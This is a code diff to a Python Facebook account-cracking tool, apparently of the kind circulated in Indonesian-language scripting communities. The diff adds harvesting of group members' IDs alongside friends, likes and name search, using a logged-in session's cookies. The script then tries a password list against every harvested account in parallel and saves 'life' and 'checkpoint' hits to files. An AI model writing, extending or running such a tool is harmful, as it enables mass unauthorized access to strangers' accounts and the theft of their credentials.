@@ -12,6 +12,7 @@ mbasic = 'https://mbasic.facebook.com{}'
 id = []
 idx = []
 idsearch = []
+grupsearch = []
 global die,check,result
 die = 0
 check = 0 
@@ -91,7 +92,7 @@ def getlike(react):
         ids  = re.findall('class="b."><a href="(.*?)">(.*?)</a></h3>',str(like))
         for user in ids:
                 if 'profile' in user[0]:
-                        idx.append(user[1] + "|" + re.findall("=(\d*)?",str(user[0]))[0])
+                        idx.append(user[1] + "|" + re.findall("=(\d*)",str(user[0]))[0])
                 else:
                         idx.append(user[1] + "|" + user[0].split('/')[1])
                 print(f'\r# {str(len(idx))} retrieved',end="")
@@ -103,13 +104,25 @@ def bysearch(option):
         users = re.findall('class="x ch"><a href="/(.*?)"><div.*?class="cj">(.*?)</div>',str(search))
         for user in users:
                 if "profile" in user[0]:
-                        idsearch.append(user[1] + "|" + re.findall("=(\d*)?",str(user[0]))[0])
+                        idsearch.append(user[1] + "|" + re.findall("=(\d*)",str(user[0]))[0])
                 else:
                         idsearch.append(user[1] + "|" + user[0].split("?")[0])
                 print(f"\r# {str(len(idsearch))} retrieved ",end="")
         if "Lihat Hasil Selanjutnya" in str(search):
                 bysearch(parser(search,'html.parser').find("a",string="Lihat Hasil Selanjutnya")["href"])
         return idsearch
+def grubid(endpoint):
+        grab = requests.get(endpoint,cookies=kuki).content
+        users = re.findall('a class=".." href="/(.*?)">(.*?)</a>',str(grab))
+        for user in users:
+                if "profile" in user[0]:
+                        grupsearch.append(user[1] + "|" + re.findall('id=(\d*)',str(user[0]))[0])
+                else:
+                        grupsearch.append(user[1] + "|" + user[0])
+                print(f"\r# {str(len(grupsearch))} retrieved ",end="")
+        if "Lihat Selengkapnya" in str(grab):
+                grubid(mbasic.format(parser(grab,"html.parser").find("a",string="Lihat Selengkapnya")["href"]))
+        return grupsearch
 if __name__ == '__main__':
         try:
                 ses = requests.Session()
@@ -120,6 +133,7 @@ if __name__ == '__main__':
                 print('1 List friends')
                 print('2 From likes ')
                 print('3 By search name ')
+                print('4 From group ')
                 print()
                 tanya = input('# Get id from : ')
                 
@@ -128,8 +142,10 @@ if __name__ == '__main__':
                         username = getid(mbasic.format(url["href"]))
                 elif tanya == '2':
                         username = input("# url : ")
-                        if 'www.facebook.com' in username:
-                               username = username.replace('www.facebook.com','mbasic.facebook.com')
+                        if username == "":
+                                exit("# Dont be empty")
+                        elif 'www.facebook' in username:
+                               username = username.replace('www.facebook','mbasic.facebook')
                         elif 'm.facebook.com' in username:
                                username = username.replace('m.facebook.com','mbasic.facebook.com')
                         username = fromlikes(username) 
@@ -138,6 +154,12 @@ if __name__ == '__main__':
                         username = bysearch(mbasic.format('/search/people/?q='+zet))
                         if len(username) == 0:
                                 exit("# no result")
+                elif tanya == '4':
+                        print("# can only take 100 IDs ")
+                        grab = input("# ID group : ")
+                        username = grubid(mbasic.format("/browse/group/members/?id=" + grab))
+                        if len(username) == 0:
+                                exit("# ID wrong")
                 print()
                 expass = input("# extra password : ")
                 print("# result will be saved in results-life and results-life")
@@ -155,7 +177,7 @@ if __name__ == '__main__':
                                         for passw in listpass:
                         #login(user,'sayang')
                                                 ex.submit(login,(users[1]),(passw))
-                print("# Done. file saved in : ")
+                print("\n# Done. file saved in : ")
                 print("        - life : results-life")
                 print("        - checkpoint : results-check")
                 exit("# thanks for using this tools")
